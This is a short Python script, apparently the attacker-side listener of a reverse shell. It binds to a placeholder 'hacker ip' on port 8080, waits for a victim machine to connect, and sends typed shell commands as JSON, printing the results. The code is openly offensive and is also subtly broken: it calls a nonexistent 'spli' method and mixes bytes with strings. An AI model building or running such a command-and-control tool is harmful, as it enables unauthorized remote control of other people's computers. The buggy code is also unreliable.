#!/usr/bin/env python

import socket
import subprocess
import json

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("hacker ip", 8080))
listener.listen(0)
print("listening on port 8080...")
connection, address = listener.accept()
print(f"connection has established from {address}")


def send(cmd):
    data = json.dumps(cmd)
    connection.send(data)


def recieve():
    res = ""
    while True:
        try:
            res += connection.recv(1024)
            return json.loads(res)
        except ValueError:
            continue

while True:
    command = input(">> ")
    command = command.spli(" ")
    send(command)
    if command[0] == "exit":
        connection.close()
        exit()
    res = recieve()
    print(res)
